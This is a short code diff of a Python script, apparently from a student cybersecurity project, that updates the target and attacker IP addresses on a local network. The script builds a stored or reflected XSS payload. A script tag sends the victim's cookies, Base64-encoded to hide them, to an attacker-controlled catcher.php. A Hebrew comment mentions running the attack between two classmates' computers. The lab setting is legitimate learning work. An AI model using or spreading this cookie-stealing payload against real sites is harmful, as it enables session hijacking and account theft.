@@ -1,11 +1,11 @@
 import urllib.parse
 
-TARGET_IP = "192.168.56.1"
+TARGET_IP = "192.168.1.161"
 TARGET_URL = f"http://{TARGET_IP}/CyberProject/home.php"
 
 # Attacker's address (where data will be sent)
 # אולי לשנות לניצן או נעם כדי להראות מ2 מחשבים
-ATTACKER_IP = "192.168.56.1"
+ATTACKER_IP = "192.168.1.151"
 
 # The Payload: stealing cookies and sending them to log.php
 js_payload = f"<script>document.location='http://{ATTACKER_IP}/CyberProject/AttackerServer/catcher.php?data=' + btoa(document.cookie);</script>" # btoa - a function that encodes a string to Base64 to hide the cookies
